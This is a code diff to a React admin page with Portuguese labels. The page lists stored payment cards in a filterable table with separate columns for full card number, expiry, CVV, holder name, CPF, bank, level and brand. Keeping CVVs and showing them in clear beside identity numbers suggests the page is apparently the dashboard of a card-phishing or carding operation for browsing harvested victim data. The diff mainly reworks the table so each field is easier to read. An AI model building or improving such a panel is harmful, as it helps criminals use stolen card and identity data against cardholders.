@@ -8,7 +8,7 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { Download, LogOut, CreditCard, ShoppingBag, Filter, Search } from 'lucide-react';
+import { Download, LogOut, CreditCard, ShoppingBag, Filter } from 'lucide-react';
 import { format, isWithinInterval, startOfDay, endOfDay } from 'date-fns';
 import { showError } from '@/utils/toast';
 
@@ -51,7 +51,6 @@ const Admin = () => {
     }
   };
 
-  // Extrair níveis e bancos únicos para os seletores
   const uniqueLevels = useMemo(() => {
     const levels = cards.map(c => c.card_level).filter(Boolean);
     return Array.from(new Set(levels));
@@ -62,7 +61,6 @@ const Admin = () => {
     return Array.from(new Set(banks));
   }, [cards]);
 
-  // Lógica de filtragem de cartões
   const filteredCards = useMemo(() => {
     return cards.filter(c => {
       const dateMatch = (!cardDateFilter.from || !cardDateFilter.to) || 
@@ -254,29 +252,45 @@ const Admin = () => {
                     <Table>
                       <TableHeader>
                         <TableRow>
-                          <TableHead>Data</TableHead>
-                          <TableHead>Cartão</TableHead>
-                          <TableHead>Validade/CVV</TableHead>
-                          <TableHead>Titular/CPF</TableHead>
-                          <TableHead>Banco/Nível</TableHead>
-                          <TableHead>Bandeira</TableHead>
+                          <TableHead className="whitespace-nowrap">Data</TableHead>
+                          <TableHead className="whitespace-nowrap">Número do Cartão</TableHead>
+                          <TableHead className="whitespace-nowrap">Validade</TableHead>
+                          <TableHead className="whitespace-nowrap">CVV</TableHead>
+                          <TableHead className="whitespace-nowrap">Nome</TableHead>
+                          <TableHead className="whitespace-nowrap">CPF</TableHead>
+                          <TableHead className="whitespace-nowrap">Banco</TableHead>
+                          <TableHead className="whitespace-nowrap">Nível</TableHead>
+                          <TableHead className="whitespace-nowrap">Bandeira</TableHead>
                         </TableRow>
                       </TableHeader>
                       <TableBody>
                         {filteredCards.map((c) => (
                           <TableRow key={c.id}>
-                            <TableCell className="text-xs">{format(new Date(c.created_at), 'dd/MM HH:mm')}</TableCell>
-                            <TableCell className="font-mono font-bold">{c.card_number}</TableCell>
-                            <TableCell>{c.expiry} | {c.cvv}</TableCell>
-                            <TableCell className="text-xs">
-                              <div className="font-bold">{c.name}</div>
-                              <div className="text-gray-400">{c.cpf}</div>
+                            <TableCell className="text-xs whitespace-nowrap">
+                              {format(new Date(c.created_at), 'dd/MM HH:mm')}
                             </TableCell>
-                            <TableCell className="text-xs">
-                              <div className="font-bold text-blue-600">{c.bank_name || 'Desconhecido'}</div>
-                              <div className="uppercase text-[10px]">{c.card_level || 'Standard'}</div>
+                            <TableCell className="font-mono font-bold whitespace-nowrap">
+                              {c.card_number}
                             </TableCell>
-                            <TableCell>
+                            <TableCell className="whitespace-nowrap">
+                              {c.expiry}
+                            </TableCell>
+                            <TableCell className="whitespace-nowrap">
+                              {c.cvv}
+                            </TableCell>
+                            <TableCell className="text-xs font-bold whitespace-nowrap">
+                              {c.name}
+                            </TableCell>
+                            <TableCell className="text-xs whitespace-nowrap">
+                              {c.cpf}
+                            </TableCell>
+                            <TableCell className="text-xs font-bold text-blue-600 whitespace-nowrap">
+                              {c.bank_name || 'N/A'}
+                            </TableCell>
+                            <TableCell className="text-[10px] uppercase font-bold whitespace-nowrap">
+                              {c.card_level || 'N/A'}
+                            </TableCell>
+                            <TableCell className="whitespace-nowrap">
                               <span className="px-2 py-1 rounded bg-gray-100 text-[10px] font-bold uppercase">
                                 {c.brand}
                               </span>
